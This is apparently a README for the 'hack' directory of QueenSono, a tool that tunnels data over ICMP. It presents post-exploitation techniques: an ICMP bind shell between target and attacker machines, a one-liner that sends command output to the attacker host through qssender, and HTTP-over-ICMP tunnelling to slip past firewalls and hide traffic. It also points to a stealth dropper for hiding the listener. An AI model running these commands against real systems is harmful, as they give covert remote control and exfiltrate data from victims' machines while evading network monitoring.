# Hack

<p align="center"><sup>🧞 "All scripts are there for inspiration and are probably not stable. If you see a good use case and need a more reliable solution, please open an issue"</sup></p>

Some fun things using `QueenSono`

* [Bind Shell](#bind-shell)
* [HTTP over ICMP tunneling](#http-over-icmp-tunneling)

## Bind Shell
<h5 align="center">In <code>QueenSono/hack/bindshell</code></h5>

<p align="center"><i> It is a "bind shell" through ICMP so it is quite ordinary if it takes time or if all commands are not well treated</i></p>

### Use case
***In Post exploitation phase:*** Sometimes, and for the post exploitation phase it is more suited, you need a bind shell. if ICMP is less monitored than other protocol (eg TCP), having a bind shell trough `QueenSono` is more stealthy.

#### How to do it?

![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono-bindshell.gif)
On both machines you need to have `qssender`and `qsreceiver`

*> On the target machine:* Launch your listener
```
./listener.sh <ip_listening_for_icmp>
```

*> On the attacker machine:* Bind to the target shell
```
./bindshell.sh <ip_target> <ip_listening_for_icmp>
```

*Product placement: To be stealthly, you `listener` should use a dropper and hide its presence. You could find a stealth dropper example in [fileless-xec](https://github.com/ariary/fileless-xec) repo. Should I adapt it to use ICMP ? 🤔*

### One-liner redirect command output

Useful if you can't spawn a shell and thus don't have output for command. You could redirect the output to your attacker machine:
```
export CMD=$([cmd]);qssender send "$CMD" -d 1 -l $LISTEN -r $REMOTE -s 100 -N
```

## HTTP over ICMP tunneling

For a much more sophisticated ICMP tunneling solution see [icmptunnel](https://github.com/DhavalKapil/icmptunnel)

<h5 align="center">In <code>QueenSono/hack/tunneling</code></h5>

<p align="center"><i> Access internet by tunneling HTTP request with ICMP</i></p>

### Use case
* Access internet but firewall rules block http traffic but allow icmp 
* If you want to hide your http tracks 
* Access internal webapp (in this case, put the `qsproxy` in the target machine and `qscurl` in the attacker machine)

#### How to do it?
```
need cap_net_raw cap         need internet access

        ┌───────────┐         ┌───────────────┐           ┌────────────┐
        │           │    1    │               │    2      │            │
        │  qscurl   └─────────►    qsproxy    └───────────►World  wide │
        │           ◄─────────┐               ◄───────────┐    web     │
        └───────────┘    4    └───────────────┘     3     │            │
                                                          └────────────┘
```

*> On the attacker machine:* Launch the proxy
```
./qsproxy.sh <ip_listening>
```

*> On the target machine:* Order a curl request to be performed by attacker machine
```
# before modify qscurl.sh with according LISTEN and REMOTE addresses
./qscurl.sh http://myawesomeattackersite.com -H \"toto:titi\"
```

